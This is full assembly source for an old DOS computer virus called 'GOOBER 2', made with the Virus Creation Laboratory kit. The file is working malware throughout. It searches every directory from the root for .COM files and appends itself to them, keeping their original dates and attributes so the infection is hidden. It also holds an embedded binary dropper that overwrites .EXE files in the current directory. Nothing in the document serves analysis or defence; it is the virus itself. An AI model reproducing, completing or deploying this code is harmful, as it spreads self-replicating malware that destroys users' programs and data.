; GOOBER2.ASM -- GOOBER 2
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by URNST KOUCH

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		call    search_files            ; Find and infect a file

		lea     dx,[di + data00]        ; DX points to data
		lea     si,[di + data01]        ; SI points to data
		push    di                      ; Save DI
		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		mov     di,bx                   ; DI points to DTA
		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		int     021h
		jc      create_file             ; If not found then create it
write_in_file:  mov     ax,04301h               ; DOS set file attributes function
		xor     cx,cx                   ; File will have no attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ax,03D01h               ; DOS open file function, write
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ax,05701h               ; DOS set file date/time function
		mov     cx,[di + 016h]          ; CX holds old file time
		mov     dx,[di + 018h]          ; DX holds old file data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		mov     ax,04301h               ; DOS set file attributes function
		xor     ch,ch                   ; Clear CH for attributes
		mov     cl,[di + 015h]          ; CL holds old attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ah,04Fh                 ; DOS find next file function
		int     021h
		jnc     write_in_file           ; If successful do next file
		jmp     short dropper_end       ; Otherwise exit
create_file:    mov     ah,03Ch                 ; DOS create file function
		xor     cx,cx                   ; File has no attributes
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
dropper_end:    pop     di                      ; Restore DI


com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		lea     dx,[di + start]         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


data00          db    "*.EXE",0

data01          dw      222H
		db      092h, 086h, 0EDh, 092h, 0E8h, 0AFh, 000h, 0E8h
		db      0ACh, 000h, 0BEh, 0FFh, 002h, 0B4h, 00Eh, 0ACh
		db      00Ah, 0C0h, 074h, 004h, 0CDh, 010h, 0EBh, 0F7h
		db      0BAh, 012h, 003h, 055h, 08Bh, 0ECh, 081h, 0ECh
		db      000h, 010h, 057h, 0B4h, 02Fh, 0CDh, 021h, 08Bh
		db      0FBh, 0B4h, 04Eh, 0B9h, 027h, 000h, 0CDh, 021h
		db      072h, 06Ch, 0B8h, 001h, 043h, 033h, 0C9h, 08Dh
		db      055h, 01Eh, 0CDh, 021h, 0B8h, 002h, 03Dh, 08Dh
		db      055h, 01Eh, 0CDh, 021h, 093h, 0B4h, 03Fh, 0B9h
		db      000h, 010h, 08Dh, 096h, 000h, 0F0h, 0CDh, 021h
		db      00Bh, 0C0h, 074h, 028h, 050h, 08Dh, 0B6h, 000h
		db      0F0h, 032h, 0E4h, 0CDh, 01Ah, 059h, 051h, 030h
		db      014h, 046h, 042h, 0E2h, 0FAh, 05Ah, 052h, 0B8h
		db      001h, 042h, 0B9h, 0FFh, 0FFh, 0F7h, 0DAh, 0CDh
		db      021h, 0B4h, 040h, 059h, 08Dh, 096h, 000h, 0F0h
		db      0CDh, 021h, 0EBh, 0C9h, 0B8h, 001h, 057h, 08Bh
		db      04Dh, 016h, 08Bh, 055h, 018h, 0CDh, 021h, 0B4h
		db      03Eh, 0CDh, 021h, 0B8h, 001h, 043h, 032h, 0EDh
		db      08Ah, 04Dh, 015h, 08Dh, 055h, 01Eh, 0CDh, 021h
		db      0B4h, 04Fh, 0CDh, 021h, 073h, 094h, 05Fh, 08Bh
		db      0E5h, 05Dh, 0E8h, 055h, 001h, 00Bh, 0C0h, 074h
		db      003h, 0EBh, 006h, 090h, 0EAh, 000h, 000h, 0FFh
		db      0FFh, 0B8h, 000h, 04Ch, 0CDh, 021h, 055h, 08Bh
		db      0ECh, 083h, 0ECh, 040h, 0B4h, 047h, 032h, 0D2h
		db      08Dh, 076h, 0C0h, 0CDh, 021h, 0B4h, 03Bh, 0BAh
		db      0DAh, 001h, 0CDh, 021h, 0E8h, 00Dh, 000h, 0B4h
		db      03Bh, 08Dh, 056h, 0C0h, 0CDh, 021h, 08Bh, 0E5h
		db      05Dh, 0C3h, 05Ch, 000h, 055h, 0B4h, 02Fh, 0CDh
		db      021h, 053h, 08Bh, 0ECh, 081h, 0ECh, 080h, 000h
		db      0B4h, 01Ah, 08Dh, 056h, 080h, 0CDh, 021h, 0B4h
		db      04Eh, 0B9h, 010h, 000h, 0BAh, 034h, 002h, 0CDh
		db      021h, 072h, 027h, 080h, 07Eh, 095h, 010h, 075h
		db      01Bh, 080h, 07Eh, 09Eh, 02Eh, 074h, 015h, 0B4h
		db      03Bh, 08Dh, 056h, 09Eh, 0CDh, 021h, 0E8h, 0CBh
		db      0FFh, 09Ch, 0B4h, 03Bh, 0BAh, 031h, 002h, 0CDh
		db      021h, 09Dh, 073h, 00Ch, 0B4h, 04Fh, 0CDh, 021h
		db      073h, 0D9h, 0BAh, 038h, 002h, 0E8h, 016h, 000h
		db      08Bh, 0E5h, 0B4h, 01Ah, 05Ah, 0CDh, 021h, 05Dh
		db      0C3h, 02Eh, 02Eh, 000h, 02Ah, 02Eh, 02Ah, 000h
		db      02Ah, 02Eh, 045h, 058h, 045h, 000h, 055h, 0B4h
		db      02Fh, 0CDh, 021h, 053h, 08Bh, 0ECh, 081h, 0ECh
		db      080h, 000h, 052h, 0B4h, 01Ah, 08Dh, 056h, 080h
		db      0CDh, 021h, 0B4h, 04Eh, 0B9h, 027h, 000h, 05Ah
		db      0CDh, 021h, 072h, 009h, 0E8h, 00Fh, 000h, 073h
		db      004h, 0B4h, 04Fh, 0EBh, 0F3h, 08Bh, 0E5h, 0B4h
		db      01Ah, 05Ah, 0CDh, 021h, 05Dh, 0C3h, 0B4h, 02Fh
		db      0CDh, 021h, 08Bh, 0F3h, 0C6h, 006h, 0F9h, 002h
		db      000h, 083h, 07Ch, 01Ch, 000h, 075h, 070h, 081h
		db      07Ch, 025h, 04Eh, 044h, 074h, 069h, 081h, 07Ch
		db      01Ah, 022h, 002h, 072h, 062h, 0B8h, 000h, 03Dh
		db      08Dh, 054h, 01Eh, 0CDh, 021h, 093h, 0B4h, 03Fh
		db      0B9h, 004h, 000h, 0BAh, 0F5h, 002h, 0CDh, 021h
		db      0B4h, 03Eh, 0CDh, 021h, 056h, 0BEh, 0F5h, 002h
		db      0BFh, 000h, 001h, 0B9h, 004h, 000h, 0F3h, 0A6h
		db      05Eh, 074h, 03Ch, 0C6h, 006h, 0F9h, 002h, 001h
		db      0B8h, 001h, 043h, 033h, 0C9h, 08Dh, 054h, 01Eh
		db      0CDh, 021h, 0B8h, 002h, 03Dh, 0CDh, 021h, 093h
		db      0B4h, 040h, 0B9h, 022h, 002h, 090h, 0BAh, 000h
		db      001h, 0CDh, 021h, 0B8h, 001h, 057h, 08Bh, 04Ch
		db      016h, 08Bh, 054h, 018h, 0CDh, 021h, 0B4h, 03Eh
		db      0CDh, 021h, 0B8h, 001h, 043h, 032h, 0EDh, 08Ah
		db      04Ch, 015h, 08Dh, 054h, 01Eh, 0CDh, 021h, 080h
		db      03Eh, 0F9h, 002h, 001h, 0C3h, 000h, 000h, 000h
		db      000h, 000h, 0A0h, 0F9h, 002h, 098h, 0C3h, 007h
		db      044h, 069h, 076h, 069h, 064h, 065h, 020h, 06Fh
		db      076h, 065h, 072h, 066h, 06Ch, 06Fh, 077h, 00Dh
		db      00Ah, 000h, 02Ah, 02Eh, 043h, 04Fh, 04Dh, 000h
		db      05Bh, 056h, 043h, 04Ch, 05Dh, 000h, 044h, 04Fh
		db      04Dh, 045h

vcl_marker      db      "[VCL]",0               ; VCL creation marker

finish          label   near

code            ends
		end     main
